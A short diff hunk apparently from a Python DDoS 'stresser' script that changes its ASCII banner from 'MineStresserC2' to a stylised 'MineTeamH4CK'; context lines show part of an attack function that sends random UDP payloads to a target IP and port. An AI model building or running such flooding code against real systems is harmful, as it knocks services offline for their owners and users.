@@ -15,7 +15,7 @@ def attack(ip, port):
     payload = os.urandom(len)
     s.sendto(payload, (ip, port))
 # VPS
-os.system("figlet MineStresserC2")
+os.system("figlet 𝕄𝕚𝕟𝕖𝕋𝕖𝕒𝕞ℍ𝟜ℂ𝕂")
 print("\033[92m")
 print("Credit: @MineGamerST")
 print(" ")
